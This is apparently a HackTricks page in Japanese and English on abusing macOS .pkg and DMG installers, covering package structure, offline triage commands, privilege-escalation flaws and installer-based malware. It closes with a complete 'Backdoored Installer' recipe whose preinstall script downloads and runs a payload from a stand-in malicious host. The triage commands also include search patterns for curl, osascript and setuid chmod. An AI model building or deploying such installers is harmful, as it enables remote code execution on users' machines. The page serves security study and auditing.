# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

macOS の **installer package**（`.pkg` file とも呼ばれます）は、macOS で **software を配布する**ために使用される file format です。これらの file は、software の install と正常な実行に必要なすべてを含む **box** のようなものです。

package file 自体は、target **computer に install される file と directory の階層**を保持する archive です。また、configuration file の設定や software の古い version の cleanup など、installation の前後に task を実行する **script** を含めることもできます。

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customization（title、welcome text など）と script/installation check
- **PackageInfo (xml)**: Info、install requirement、install location、実行する script への path
- **Bill of materials (bom)**: file permission とともに install、update、または remove する file の list
- **Payload (CPIO archive gzip compressed)**: PackageInfo の `install-location` に install する file
- **Scripts (CPIO archive gzip compressed)**: Pre-install および post-install script と、execution 用に temp directory へ extract されるその他の resource

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
インストーラの内容を手動で解凍せずに確認するには、無料ツール [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) も使用できます。

### Static triage shortcuts

目的が分析である場合は、まずパッケージを `Installer.app` で開くことを**避けてください**。パッケージによっては、Installer で開いた直後にコードを実行できるものがあります（たとえば `system.run()` や installer plug-ins を介して実行されます）。そのため、通常は offline extraction から開始する方が安全です。
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG 基本情報

DMG ファイル、つまり Apple Disk Images は、Apple の macOS でディスクイメージに使用されるファイル形式です。DMG ファイルは基本的に、**マウント可能なディスクイメージ**（独自のファイルシステムを含む）であり、通常は圧縮され、場合によっては暗号化された raw ブロックデータを含んでいます。DMG ファイルを開くと、macOS は**物理ディスクであるかのようにマウント**し、その内容にアクセスできるようにします。

> [!CAUTION]
> **`.dmg`** installer は**非常に多くの形式**に対応しているため、過去には脆弱性を含むものが悪用され、**kernel code execution** の取得に利用されました。

### 階層

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG ファイルの階層は、内容によって異なる場合があります。ただし、application DMG では通常、次の構造に従います。

- Top Level: これは disk image のルートです。通常、application と、Applications フォルダーへのリンクが含まれています。
- Application (.app): これは実際の application です。macOS では、application は通常、application を構成する多数の個別ファイルとフォルダーを含む package です。
- Applications Link: これは macOS の Applications フォルダーへのショートカットです。これにより、application を簡単に install できます。.app ファイルをこのショートカットへドラッグすると、app を install できます。

## pkg abuse による Privesc

### public directories からの実行

たとえば、pre または post installation script が **`/var/tmp/Installerutil`** から実行され、attacker がその script を control できる場合、その script が実行されるたびに privileges を escalate できます。別の類似した例を示します:<sup>[1][3]</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

これは、複数の installer や updater が**root として何かを実行する**ために呼び出す[public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)です。この function は、**実行する** **file** の**path**を parameter として受け取ります。しかし、attacker がこの file を**modify**できる場合、root 権限での実行を**abuse**して**privileges を escalate**できます。
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
詳細については、こちらの talk を確認してください: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[8]</sup>

### Environment と shebang abuse

Modern PackageKit のバグから、installer scripts は、攻撃者が制御可能なコンテキストを近くに残したまま、**trusted root code** として実行されることが多いと分かりました。vendor packages を audit する際は、次の点に特に注意してください。

- `#!/bin/zsh` / `#!/bin/bash` などの Shell interpreters
- `sudo -u $USER`、`launchctl asuser` などの呼び出し、または `$USER`、`$HOME`、`PATH`、`TMPDIR`、相対パスを信頼するロジック
- user-controlled init files や libraries を load する可能性のある、Shell 以外の interpreters
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment bug（ユーザーが開始した install 中の `~/.zshenv` / `~/.bash*` の継承）については、[the generic macOS privesc page](../macos-privilege-escalation.md) を確認してください。package が **Apple-signed** の場合、`system_installd` が `com.apple.rootless.install.heritable` を持つ可能性があるため、同じ script bug が **SIP/TCC-relevant** になることがあります。[the SIP page](../macos-security-protections/macos-sip.md) を参照してください。<sup>[5][6]</sup>

### mount による実行

installer が `/tmp/fixedname/bla/bla` に書き込む場合、`noowners` を指定して `/tmp/fixedname` 上に **mount を作成**し、**installation 中に任意の file を変更**して installation process を悪用できる可能性があります。

この例として **CVE-2021-26089** があり、**periodic script を上書き**して root として実行させることに成功しました。詳細については、talk [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE) を参照してください。<sup>[7]</sup>

## pkg as malware

### Empty Payload

実際の payload はなく、script 内の malware だけを含む **` .pkg`** file を、**pre and post-install scripts** とともに生成することが可能です。

### Distribution xml 内の JS

package の **distribution xml** file に **`<script>`** tags を追加でき、その code は実行されます。また、**`system.run`** を使用して **commands を実行**できます。

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Distribution packages では、これは通常、`allow-external-scripts="true"` などによって、top-level の `Distribution` file が external scripts を有効にしているかどうかに依存します。したがって、`preinstall` / `postinstall` だけを review するのでは不十分です。**Distribution XML 自体**に `installation-check` / `volume-check` hooks と、`system.run()` / `system.runOnce()` の直接的な execution paths を含めることができます。
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

dist.xml 内の script と JS code を使用する malicious installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## 参考資料

- [1] [DEF CON 27 - Pkgsのアンパック：Macos Installer Packagesの内部と一般的なSecurity Flawsを見る](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: 「macOS InstallersのWild World」 - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - MacOS Installer Packagesのアンパック](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe - macOS Red Teaming: Installer PackagesのExploiting](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple-signed PackagesによるSIPのBreaking](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: 「Mount(ain) of Bugs」 - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOSで1000個のInstallersによるDeath、そしてすべてが壊れている！](https://www.youtube.com/watch?v=lTOItyjTTkw)

{{#include ../../../banners/hacktricks-training.md}}
